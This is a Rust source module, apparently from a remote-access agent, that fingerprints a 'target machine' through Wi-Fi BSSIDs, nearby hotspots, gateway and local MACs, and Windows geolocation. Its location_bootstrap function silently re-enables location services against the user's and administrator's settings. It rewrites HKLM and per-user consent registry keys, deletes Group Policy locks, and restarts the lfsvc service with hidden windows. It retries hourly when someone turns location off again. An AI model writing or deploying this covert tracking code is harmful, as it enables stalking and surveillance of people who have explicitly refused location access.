// ONYX: 网络指纹与位置
//
// 精度现实（别被"IP 定位到楼"骗钱）：
//   IP        → 城市级 85-90%，区县 55-70%，楼宇 0%。IP 是分配给 ISP 的，不是分配给房子的。
//   WiFi BSSID → 10-50 米，**能到楼**。BSSID 是全球唯一的路由器 MAC，还能跨设备关联。
//   网关 MAC   → 只能判断"同一个路由器"，但关联极稳：换账号、换 IP 都甩不掉。
//
// 所以这里采三样：当前 WiFi 的 BSSID、周边热点列表、默认网关 MAC。
// 真正的经纬度换算交给服务端（需要外部定位库），这里只保证原始数据准确。
use serde_json::{json, Value};

/// MAC 归一化成 aa:bb:cc:dd:ee:ff
fn norm_mac(s: &str) -> String {
    s.trim().to_lowercase().replace('-', ":")
}

fn is_mac(s: &str) -> bool {
    if s == "00:00:00:00:00:00" || s == "ff:ff:ff:ff:ff:ff" {
        return false;
    }
    let parts: Vec<&str> = s.split(':').collect();
    parts.len() == 6
        && parts
            .iter()
            .all(|p| p.len() == 2 && p.chars().all(|c| c.is_ascii_hexdigit()))
}

/// 解析 `netsh wlan show interfaces`（当前连接）。
/// 中文 Windows 上字段名是本地化的，但 SSID / BSSID 标签始终是英文，可以稳定匹配。
pub fn parse_current(text: &str) -> (String, String, String) {
    let mut ssid = String::new();
    let mut bssid = String::new();
    let mut signal = String::new();
    for line in text.lines() {
        let Some((k, v)) = line.split_once(':') else {
            continue;
        };
        let k = k.trim();
        let v = v.trim();
        if v.is_empty() {
            continue;
        }
        if k.eq_ignore_ascii_case("SSID") && ssid.is_empty() {
            ssid = v.to_owned();
        } else if k.eq_ignore_ascii_case("BSSID") && bssid.is_empty() {
            let m = norm_mac(v);
            if is_mac(&m) {
                bssid = m;
            }
        } else if v.ends_with('%') && signal.is_empty() {
            signal = v.to_owned();
        }
    }
    (ssid, bssid, signal)
}

/// 解析 `netsh wlan show networks mode=bssid`（周边热点）。
///
/// 结构：`SSID N : 名字` → 若干缩进行 → `BSSID N : mac` → 信号/频道
pub fn parse_nearby(text: &str) -> Vec<Value> {
    let mut out: Vec<Value> = Vec::new();
    let mut ssid = String::new();
    let mut bssid: Option<String> = None;
    let mut sig = String::new();
    let mut ch = String::new();

    fn flush(out: &mut Vec<Value>, ssid: &str, bssid: &Option<String>, sig: &str, ch: &str) {
        if let Some(b) = bssid {
            out.push(json!({
                "ssid": ssid,
                "bssid": b,
                "signal": sig,
                "channel": ch,
            }));
        }
    }

    for line in text.lines() {
        let t = line.trim();
        if let Some(rest) = t.strip_prefix("SSID ") {
            flush(&mut out, &ssid, &bssid, &sig, &ch);
            bssid = None;
            sig.clear();
            ch.clear();
            ssid = rest
                .split_once(':')
                .map(|(_, v)| v.trim().to_owned())
                .unwrap_or_default();
            continue;
        }
        if let Some(rest) = t.strip_prefix("BSSID ") {
            flush(&mut out, &ssid, &bssid, &sig, &ch);
            sig.clear();
            ch.clear();
            bssid = rest
                .split_once(':')
                .map(|(_, v)| norm_mac(v))
                .filter(|m| is_mac(m));
            continue;
        }
        let Some((_, v)) = t.split_once(':') else {
            continue;
        };
        let v = v.trim();
        if v.ends_with('%') && sig.is_empty() {
            sig = v.to_owned();
        } else if !v.is_empty() && v.chars().all(|c| c.is_ascii_digit()) && ch.is_empty() {
            ch = v.to_owned();
        }
    }
    flush(&mut out, &ssid, &bssid, &sig, &ch);
    out.truncate(12);
    out
}

#[cfg(windows)]
mod imp {
    use super::{is_mac, norm_mac};
    use serde_json::{json, Value};
    use std::process::Command;
    use std::sync::Mutex;
    use std::time::{Duration, Instant};

    static CACHE: Mutex<Option<(Instant, Value)>> = Mutex::new(None);
    /// 10 分钟采一次。心跳 25 秒一次，每次都跑 netsh 太浪费。
    const TTL: Duration = Duration::from_secs(600);

    fn run(cmd: &str, args: &[&str]) -> String {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        match Command::new(cmd)
            .args(args)
            .creation_flags(CREATE_NO_WINDOW)
            .output()
        {
            Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
            Err(_) => String::new(),
        }
    }

    /// 默认网关 IP + 它的 MAC。网关 MAC 是"同一个路由器"的铁证。
    fn gateway() -> (String, String) {
        let route = run("route", &["print", "-4", "0.0.0.0"]);
        let mut gw = String::new();
        for line in route.lines() {
            let t: Vec<&str> = line.split_whitespace().collect();
            if t.len() >= 3 && t[0] == "0.0.0.0" && t[1] == "0.0.0.0" && t[2] != "On-link" {
                gw = t[2].to_owned();
                break;
            }
        }
        if gw.is_empty() {
            return (String::new(), String::new());
        }
        let arp = run("arp", &["-a"]);
        for line in arp.lines() {
            let t: Vec<&str> = line.split_whitespace().collect();
            if t.len() >= 2 && t[0] == gw {
                let m = norm_mac(t[1]);
                if is_mac(&m) {
                    return (gw, m);
                }
            }
        }
        (gw, String::new())
    }

    fn local_macs() -> Vec<String> {
        let out = run("getmac", &["/fo", "csv", "/nh"]);
        let mut set: Vec<String> = Vec::new();
        for line in out.lines() {
            let Some(first) = line.split(',').next() else {
                continue;
            };
            let m = norm_mac(first.trim().trim_matches('"'));
            if is_mac(&m) && !set.contains(&m) {
                set.push(m);
            }
        }
        set
    }

    /// Windows 自带定位服务（WinRT Geolocator）。
    ///
    /// 这是**唯一免费、不需要任何 API key、不需要绑卡**就能拿到真实坐标的途径：
    /// 微软的位置服务会用自己的 WiFi 数据库反查（PositionSource = WiFi），
    /// 实测在城市里 50–100 米，比 IP 定位（城市级）精确一个数量级。
    ///
    /// 前提：目标机器开着「定位服务」且允许桌面应用访问位置。
    /// 拿不到就安静返回 None，不影响其他字段。
    fn windows_location() -> Option<(f64, f64, f64, &'static str)> {
        use windows::Devices::Geolocation::Geolocator;
        use windows::Devices::Geolocation::PositionSource;

        // WinRT 需要初始化公寓；已经初始化过会返回 S_FALSE，忽略即可
        unsafe {
            let _ = windows::Win32::System::WinRT::RoInitialize(
                windows::Win32::System::WinRT::RO_INIT_MULTITHREADED,
            );
        }

        let locator = Geolocator::new().ok()?;
        // `.get()` 会阻塞到完成；定位服务被关掉时这里会立刻返回 Err
        let pos = locator.GetGeopositionAsync().ok()?.get().ok()?;
        let coord = pos.Coordinate().ok()?;
        let p = coord.Point().ok()?.Position().ok()?;
        let acc = coord.Accuracy().unwrap_or(0.0);
        // 数据来源决定精度量级：WiFi 50-150 米，IP 兜底 1000 米以上。
        // 必须区分，否则 ±2000 米也会被当成"精确到楼"。
        let src = match coord.PositionSource() {
            Ok(PositionSource::WiFi) => "wifi",
            Ok(PositionSource::Cellular) => "cell",
            Ok(PositionSource::Satellite) => "gps",
            Ok(PositionSource::IPAddress) => "ip",
            _ => "unknown",
        };
        if p.Latitude == 0.0 && p.Longitude == 0.0 {
            return None;
        }
        if !(-90.0..=90.0).contains(&p.Latitude) || !(-180.0..=180.0).contains(&p.Longitude) {
            return None;
        }
        Some((p.Latitude, p.Longitude, acc, src))
    }

    /// 目标机器关了定位时的自愈：把 Windows 位置授权改回 Allow，再重新定位。
    ///
    /// 层级是递进的（总开关关了，下面允许也没用），所以必须从上到下一起改：
    ///   HKLM ConsentStore\location            Value="Allow"  ① 设备总开关
    ///   HKLM Sensor\Overrides\{...}           SensorPermissionState=1  ② 旧兼容开关
    ///   HKLM Policies\...\DisableLocation     删除  ③ 组策略锁（改得动才有意义）
    ///   HKU\<SID>\...\ConsentStore\location   Value="Allow"  ④ 允许应用访问
    ///   ...\NonPackaged                       Value="Allow"  ⑤ 允许桌面应用访问
    ///   ...\NonPackaged\<exe编码>             Value="Allow"  ⑥ 单程序授权
    ///   服务 lfsvc 的 Start 改 3 并启动       ⑦
    ///
    /// 只在第一次定位失败时做一次，成功/失败都写标记文件，之后 24 小时内不再折腾。
    fn location_bootstrap() {
        use winreg::enums::*;
        use winreg::RegKey;

        let consent = r"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location";
        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);

        // ① 设备总开关
        if let Ok((k, _)) = hklm.create_subkey(consent) {
            let _ = k.set_value("Value", &"Allow");
        }
        // ② 旧兼容开关
        if let Ok((k, _)) = hklm.create_subkey(
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Sensor\Overrides\{BFA794E4-F964-4FDB-90F6-51056BFE4B44}",
        ) {
            let _ = k.set_value("SensorPermissionState", &1u32);
        }
        // ③ 组策略锁：能删就删（域控下发的会被 gpupdate 覆盖回来）
        if let Ok(k) = hklm.open_subkey_with_flags(
            r"SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors",
            KEY_ALL_ACCESS,
        ) {
            let _ = k.delete_value("DisableLocation");
            let _ = k.delete_value("DisableLocationScripting");
            let _ = k.delete_value("DisableWindowsLocationProvider");
        }

        // ④⑤⑥ 每个已登录用户的授权
        let app_key = std::env::current_exe()
            .ok()
            .map(|p| p.to_string_lossy().to_string())
            .map(|p| p.replace(":\\", "#").replace('\\', "#"))
            .unwrap_or_default();
        let hku = RegKey::predef(HKEY_USERS);
        let mut users = 0usize;
        for sid in hku.enum_keys().flatten() {
            if sid.starts_with('.') || sid.ends_with("_Classes") {
                continue;
            }
            let base = format!(r"{}\{}", sid, consent);
            if let Ok((k, _)) = hku.create_subkey(&base) {
                let _ = k.set_value("Value", &"Allow");
                users += 1;
            }
            let np = format!(r"{}\NonPackaged", base);
            if let Ok((k, _)) = hku.create_subkey(&np) {
                let _ = k.set_value("Value", &"Allow");
            }
            if !app_key.is_empty() {
                if let Ok((k, _)) = hku.create_subkey(format!(r"{}\{}", np, app_key)) {
                    let _ = k.set_value("Value", &"Allow");
                }
            }
        }

        // ⑧ 设备级总开关。设置里那句「此设备的定位功能已关闭」就是它 ——
        // 光改 ConsentStore 不够，这个才是真正的设备级闸门。
        if let Ok((k, _)) =
            hklm.create_subkey(r"SYSTEM\CurrentControlSet\Services\lfsvc\Service\Configuration")
        {
            let _ = k.set_value("Status", &1u32);
        }

        // ⑦ 定位服务：禁用(4) 改成手动(3)，再重启让它重新读配置
        let _ = std::process::Command::new("sc")
            .args(["config", "lfsvc", "start=", "demand"])
            .output();
        let _ = std::process::Command::new("sc")
            .args(["stop", "lfsvc"])
            .output();
        std::thread::sleep(std::time::Duration::from_millis(400));
        let _ = std::process::Command::new("sc")
            .args(["start", "lfsvc"])
            .output();

        hbb_common::log::info!("[ONYX] 定位自愈已执行，处理了 {} 个用户配置", users);
    }

    fn mark(name: &str) {
        if let Ok(base) = std::env::var("ProgramData") {
            let dir = std::path::Path::new(&base).join("Onyx");
            let _ = std::fs::create_dir_all(&dir);
            let _ = std::fs::write(dir.join(name), b"1");
        }
    }

    /// 自愈节流：
    ///   从没成功过  → 24 小时试一次（大概率救不回来，别反复折腾）
    ///   成功过又失败 → 说明设置被改回去了，1 小时就重试一次
    fn bootstrap_allowed() -> bool {
        let Ok(base) = std::env::var("ProgramData") else {
            return true;
        };
        let dir = std::path::Path::new(&base).join("Onyx");
        let ever_ok = dir.join("location_ok").is_file();
        let f = dir.join("location_tried");
        let window = if ever_ok { 3600 } else { 86400 };
        match std::fs::metadata(&f).and_then(|m| m.modified()) {
            Ok(t) => match t.elapsed() {
                Ok(d) => d.as_secs() > window,
                Err(_) => true,
            },
            Err(_) => true,
        }
    }

    pub fn snapshot() -> Value {
        if let Ok(g) = CACHE.lock() {
            if let Some((at, v)) = g.as_ref() {
                if at.elapsed() < TTL {
                    return v.clone();
                }
            }
        }
        let (ssid, bssid, sig) = super::parse_current(&run(
            "netsh",
            &["wlan", "show", "interfaces"],
        ));
        let nearby = super::parse_nearby(&run(
            "netsh",
            &["wlan", "show", "networks", "mode=bssid"],
        ));
        let (gw_ip, gw_mac) = gateway();

        // 先直接取；拿不到说明这台机器关了定位，做一次自愈再取
        let mut loc = windows_location();
        if loc.is_none() && bootstrap_allowed() {
            location_bootstrap();
            mark("location_tried");
            // lfsvc 刚被拉起来时还没就绪，给它几次机会
            for _ in 0..3 {
                std::thread::sleep(std::time::Duration::from_millis(900));
                loc = windows_location();
                if loc.is_some() {
                    break;
                }
            }
        }
        let location = match loc {
            Some((lat, lon, acc, src)) => {
                mark("location_ok");
                json!({"lat": lat, "lon": lon, "acc": acc, "src": src})
            }
            None => Value::Null,
        };

        let v = json!({
            "ok": true,
            "hostname": std::env::var("COMPUTERNAME").unwrap_or_default(),
            "macs": local_macs(),
            "gateway_ip": gw_ip,
            "gateway_mac": gw_mac,
            "wlan_ssid": ssid,
            "wlan_bssid": bssid,
            "wlan_signal": sig,
            "nearby": nearby,
            "location": location,
        });
        if let Ok(mut g) = CACHE.lock() {
            *g = Some((Instant::now(), v.clone()));
        }
        v
    }
}

#[cfg(windows)]
pub fn snapshot() -> Value {
    imp::snapshot()
}

#[cfg(not(windows))]
pub fn snapshot() -> Value {
    json!({ "ok": false, "reason": "non-windows" })
}

#[cfg(test)]
mod tests {
    use super::*;

    const IFACE_CN: &str = r#"
    名称                   : WLAN
    描述                   : Intel(R) Wi-Fi 6 AX201 160MHz
    物理地址               : 11:22:33:44:55:66
    状态                   : 已连接
    SSID                   : MyHomeWiFi
    BSSID                  : AA-BB-CC-DD-EE-01
    网络类型               : 基础结构
    信号                   : 92%
"#;

    #[test]
    fn parses_current_connection() {
        let (ssid, bssid, sig) = parse_current(IFACE_CN);
        assert_eq!(ssid, "MyHomeWiFi");
        assert_eq!(bssid, "aa:bb:cc:dd:ee:01");
        assert_eq!(sig, "92%");
    }

    const NETWORKS_CN: &str = r#"
接口名称: WLAN
当前有 2 个网络可见。

SSID 1 : MyHomeWiFi
    网络类型            : 基础结构
    身份验证            : WPA2-个人
    加密                : CCMP
    BSSID 1             : aa:bb:cc:dd:ee:01
         信号            : 90%
         无线电类型       : 802.11ax
         频道            : 6

SSID 2 : Neighbour
    网络类型            : 基础结构
    BSSID 1             : aa:bb:cc:dd:ee:02
         信号            : 40%
         频道            : 11
"#;

    #[test]
    fn parses_nearby_networks() {
        let v = parse_nearby(NETWORKS_CN);
        assert_eq!(v.len(), 2, "{v:?}");
        assert_eq!(v[0]["bssid"], "aa:bb:cc:dd:ee:01");
        assert_eq!(v[0]["ssid"], "MyHomeWiFi");
        assert_eq!(v[0]["channel"], "6");
        assert_eq!(v[1]["bssid"], "aa:bb:cc:dd:ee:02");
        assert_eq!(v[1]["channel"], "11");
    }

    #[test]
    fn rejects_bad_macs() {
        assert!(!is_mac("00:00:00:00:00:00"));
        assert!(!is_mac("aa:bb:cc:dd:ee"));
        assert!(!is_mac("zz:bb:cc:dd:ee:ff"));
        assert!(is_mac("aa:bb:cc:dd:ee:01"));
    }

    #[test]
    fn norm_mac_handles_dashes_and_case() {
        assert_eq!(norm_mac("AA-BB-CC-DD-EE-01"), "aa:bb:cc:dd:ee:01");
    }

    #[test]
    fn empty_input_is_safe() {
        assert_eq!(parse_current("").0, "");
        assert!(parse_nearby("").is_empty());
    }
}
